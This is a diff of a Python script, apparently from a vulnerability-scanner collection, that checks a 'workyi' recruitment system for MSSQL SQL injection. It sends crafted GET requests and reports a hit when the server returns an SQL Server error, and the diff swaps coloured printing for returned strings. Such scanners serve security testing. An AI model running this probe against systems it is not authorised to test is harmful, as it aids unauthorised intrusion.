@@ -9,8 +9,8 @@ description: 多处存在mssql SQL注入。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class workyi_multi_sqli_BaseVerify:
     def __init__(self, url):
@@ -34,12 +34,12 @@ class workyi_multi_sqli_BaseVerify:
                 vulnurl = self.url + turl + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if req.status_code == 500 and r"Microsoft SQL Server" in req.text:
-                    cprint("[+]存在workyi人才系统多处注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    return "[+]存在workyi人才系统多处注入漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = workyi_multi_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
